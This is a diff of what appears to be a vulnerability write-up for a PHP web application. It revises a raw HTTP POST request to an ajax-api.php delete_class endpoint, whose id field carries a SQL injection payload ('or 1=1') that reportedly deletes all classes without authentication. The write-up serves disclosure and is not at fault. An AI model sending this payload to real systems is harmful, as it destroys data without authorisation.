@@ -40,10 +40,12 @@ public function delete_class(){
 ```http 
 POST /ajax-api.php?action=delete_class HTTP/1.1
 Host: localhost
-Content-Length: 16
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 19
 Connection: close
 
-id=7'+or+1=1;--+
+id=1337'+or+1=1;--+
 ```
 
 DELETES all classes without authentication.
